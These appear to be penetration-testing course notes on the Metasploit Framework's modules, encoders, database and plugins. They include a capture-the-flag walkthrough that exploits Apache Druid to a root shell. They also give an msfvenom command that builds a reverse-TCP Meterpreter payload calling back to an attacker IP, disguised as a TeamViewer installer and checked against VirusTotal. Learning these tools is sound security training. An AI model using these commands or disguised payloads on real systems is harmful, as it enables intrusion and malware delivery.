# 08 — Metasploit Framework · 1. MSF Components

## Modules

| Type | Description |
|---|---|
| `Auxiliary` | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality. |
| `Encoders` | Ensure that payloads arrive intact at their destination. |
| `Exploits` | Modules that exploit a vulnerability to allow payload delivery. |
| `NOPs` | (No Operation code) Keep payload sizes consistent across exploit attempts. |
| `Payloads` | Code that runs remotely and calls back to the attacker machine to establish a connection (or shell). |
| `Plugins` | Additional scripts that can be integrated within an assessment and coexist with `msfconsole`. |
| `Post` | Wide array of modules to gather information, pivot deeper, etc. |

Only the following module types are interactive and can be loaded with the `use` keyword:

| Type | Description |
|---|---|
| `Auxiliary` | Scanning, fuzzing, sniffing, and admin capabilities. |
| `Exploits` | Modules that exploit a vulnerability to allow payload delivery. |
| `Post` | Post-exploitation: gather info, pivot deeper, etc. |

## Targets

`show targets` (run from inside an exploit module) lists all vulnerable targets supported by that specific exploit.

```sh
show targets
```

## Payloads

Nothing new here. Just remember the capabilities of a **Meterpreter** session — PrivEsc, hash dumping, file download/upload, etc.

---

## Lab — Apache Druid RCE

**Target:** `10.129.203.52`
**Task:** Exploit the Apache Druid service, read `flag.txt`, and submit its contents.

### 1. Service enumeration

```sh
nmap -oN target_service_enum 10.129.203.52 -sC -sV
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
8081/tcp open  http    Jetty 9.4.12.v20180830
| http-title: Apache Druid
8082/tcp open  http    Jetty 9.4.12.v20180830
8083/tcp open  http    Jetty 9.4.12.v20180830
8888/tcp open  http    Jetty 9.4.12.v20180830
| http-title: Apache Druid
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 2. Find the matching module

```sh
search Apache Druid
```

```
#  Name                                            Disclosure Date  Rank       Check  Description
-  ----                                            ---------------  ----       -----  -----------
0  exploit/linux/http/apache_druid_js_rce          2021-01-21       excellent  Yes    Apache Druid 0.20.0 Remote Command Execution
3  exploit/multi/http/apache_druid_cve_2023_25194  2023-02-07       excellent  Yes    Apache Druid JNDI Injection RCE
7  auxiliary/scanner/http/log4shell_scanner        2021-12-09       normal     No     Log4Shell HTTP Scanner
```

### 3. Configure and run

```sh
use 0
set rhost 10.129.203.52
set lhost 10.10.15.67
run
```

### 4. Grab the flag

```sh
shell
whoami       # root
cd /root
ls           # druid  druid.sh  flag.txt
cat flag.txt
```

> **Answer — flag.txt:** `HTB{MSF_Expl01t4t10n}`

---

## Encoders

`Encoders` change the payload so it can run on different operating systems and architectures:

| `x64` | `x86` | `sparc` | `ppc` | `mips` |
|---|---|---|---|---|

> Most encoders are detected by modern AV solutions, so encoding alone is rarely enough for evasion today.

List available encoders for a payload:

```sh
show encoders
```

Set the number of encoding iterations with `-i`:

```sh
msfvenom -a x86 --platform windows \
  -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 \
  -e x86/shikata_ga_nai -f exe -i 10 \
  -o /root/Desktop/TeamViewerInstall.exe
```

Analyze a payload's detection rate with the bundled `msf-virustotal` tool (requires an API key):

```sh
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

---

## Database

MSF can import hosts and scan results, store credentials/loot, and back up the database — keeping hosts, services, and vulnerabilities available at a glance.

---

## Plugins

Plugins are third-party tools and software integrated into MSF. They bring well-known software into `msfconsole` (or Metasploit Pro), automate repetitive tasks, add new commands, and work directly with the framework API. Results are documented automatically into the active database.

### Listing installed plugins

The default plugin directory for every new install is `/usr/share/metasploit-framework/plugins`:

```sh
ls /usr/share/metasploit-framework/plugins
```

```
aggregator.rb  beholder.rb  event_tester.rb  komand.rb  msfd.rb  nexpose.rb  request.rb  ...
alias.rb       db_credcollect.rb  ffautoregen.rb  lab.rb  msgrpc.rb  openvas.rb  ...
```

### Loading a plugin

```sh
load nessus
nessus_help
```

```
[*] Nessus Bridge for Metasploit
[*] Type nessus_help for a command listing
[*] Successfully loaded Plugin: Nessus
```

If a plugin name isn't found, MSF returns a load error:

```
[-] Failed to load plugin from /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb:
    cannot load such file
```

### Installing new plugins

New popular plugins ship with Parrot OS updates. To add a custom one, drop the `.rb` file into `/usr/share/metasploit-framework/plugins` with the right permissions.

Example — DarkOperator's Metasploit-Plugins:

```sh
git clone https://github.com/darkoperator/Metasploit-Plugins
ls Metasploit-Plugins
```

Copy a plugin into MSF:

```sh
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```

Then load it inside `msfconsole`; the help menu is extended with its new commands:

```sh
msfconsole -q
load pentest
help
```

Loading `pentest` adds command groups like Tradecraft, `auto_exploit`, Discovery, Project, and Postauto (e.g. `multi_cmd`, `multi_meter_cmd`, `network_discover`, `pivot_network_discover`).

### Popular plugins

| Plugin | Notes |
|---|---|
| Nmap | pre-installed |
| NexPose | pre-installed |
| Nessus | pre-installed |
| Mimikatz | pre-installed (v1) |
| Stdapi | pre-installed |
| Incognito | pre-installed |
| Railgun | — |
| Priv | — |
| DarkOperator's | external |

---

## Mixins

MSF is written in Ruby, an object-oriented language. Mixins are classes that act as methods for other classes without being their parent — so it's *inclusion*, not inheritance. They're used when you want to provide many optional features to a class, or reuse one feature across many classes.

In Ruby, Mixins are implemented as Modules via the `include` keyword. You don't need to worry about them when starting out — they're noted here only to show how deep Metasploit's customization can go.

---

## Quick reference

```sh
# Load Nessus plugin
load nessus
nessus_help

# Copy a plugin into MSF
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```
